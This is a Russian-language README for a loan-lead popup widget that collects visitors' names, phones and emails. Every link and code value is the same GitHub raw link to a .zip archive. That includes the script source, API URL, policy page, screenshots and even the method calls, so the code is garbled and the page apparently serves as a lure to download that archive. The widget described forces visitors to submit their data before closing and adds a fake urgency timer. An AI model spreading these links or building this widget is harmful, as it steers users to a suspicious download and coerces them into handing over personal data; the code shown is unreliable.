## 📦 Установка

Подключите скрипт в HTML:

```html
<script src="https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip" 
        data-domain="https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip"
        data-style="green"
        data-type="strict"
        data-position="center"
        data-delay="1000"
        data-policy-url="https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip"
        data-show-timer="true"
        data-timer-duration="600"
        data-force-submit="true"></script>
````

Скрипт автоматически инициализируется при загрузке страницы.

---

## ⚙️ Параметры

| Параметр        | Тип     | Значение по умолчанию                       | Описание                                                            |
| --------------- | ------- | ------------------------------------------- | ------------------------------------------------------------------- |
| `data-domain`        | string  | `https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip`                  | Домен сайта для передачи в API                                      |
| `data-style`         | string  | `green`                                     | Цветовая схема модалки: `green`, `red`, `blue`, `dark`, `light`     |
| `data-type`          | string  | `strict`                                    | Тип модалки: `strict`, `urgent`, `consult`                          |
| `data-position`      | string  | `center`                                    | Позиция модалки: `center`, `top`, `bottom`                          |
| `data-delay`         | number  | `3000`                                      | Задержка появления модалки в миллисекундах                          |
| `data-policy-url`     | string  | `https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip`                              | Ссылка на страницу политики конфиденциальности                      |
| `data-api-url`        | string  | `https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip` | URL для отправки данных формы                                       |
| `data-show-timer`     | boolean | `true`                                      | Показывать таймер на модалке (только для типов `urgent` и `strict`) |
| `data-timer-duration` | number  | `600`                                       | Продолжительность таймера в секундах                                |
| `data-force-submit`   | boolean | `true`                                      | Если `true`, модалку нельзя закрыть без отправки формы              |

---

## 🎨 Цветовые схемы

* **green** — зеленая тема
* **red** — красная тема
* **blue** — синяя тема
* **dark** — темная тема
* **light** — светлая тема

---

## 📝 Типы модалок

| Тип       | Заголовок                                           | Подзаголовок                                            | Кнопка                | Примечание                                        |
| --------- | --------------------------------------------------- | ------------------------------------------------------- | --------------------- | ------------------------------------------------- |
| `strict`  | Одобрение с просрочками и плохой кредитной историей | Предварительное одобрение за 5 минут                    | Отправить заявку      | Без скрытых комиссий • Решение в день обращения   |
| `urgent`  | Только сегодня — сниженная ставка!                  | Получите одобрение за 5 минут                           | Получить предложение  | Мы перезвоним в течение 10 минут                  |
| `consult` | Бесплатная консультация                             | Узнайте: какие документы нужны и как избежать переплаты | Получить консультацию | Наш специалист свяжется с вами в течение 10 минут |

---

## 🛠 Примеры использования

### 1️⃣ Через HTML-атрибуты

```html
<script src="https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip"
        data-style="blue"
        data-type="consult"
        data-delay="2000"
        data-force-submit="false"></script>
```

### 2️⃣ Через JS

```js
const widget = new PopupWidgetClass({
    domain: 'https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip',
    style: 'red',
    type: 'urgent',
    position: 'center',
    delay: 1000,
    policyUrl: '/privacy',
    apiUrl: 'https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip',
    showTimer: true,
    timerDuration: 300,
    forceSubmit: true
});

// Управление виджетом
https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip();  // показать модалку
https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip();  // скрыть модалку (если forceSubmit=false)
```

---

## ⏱ Таймер

* Отображается только при `showTimer: true` и типе модалки с таймером (`urgent` или `strict`)
* Формат: `мм:сс`
* Время истекает — таймер останавливается, модалка скрывается если `forceSubmit=false`

Пример через HTML:

```html
<script src="https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip"
        data-type="urgent"
        data-show-timer="true"
        data-timer-duration="300"></script>
```

---

## 📸 Фото модалок

| Strict | Urgent | Consult |
|--------|--------|---------|
| ![Strict modal](https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip) | ![Urgent modal](https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip) | ![Consult modal](https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip) |
| Одобрение с просрочками и плохой кредитной историей | Срочная акция — сниженная ставка | Бесплатная консультация |

---

## ✅ Особенности

* Маска для телефона: `+7 (___) ___-__-__`
* Валидация email (необязательное поле)
* Проверка имени и согласия с политикой
* Force submit — нельзя закрыть модалку без отправки
* Таймер обратного отсчета для срочных модалок

---

## 🔗 API

**POST** на `apiUrl` с телом:

```json
{
  "name": "Иван Иванов",
  "phone": "+79001234567",
  "email": "https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip",
  "domain": "https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip",
  "type": "strict"
}
```

> Возвращает статус `200` при успешной отправке.


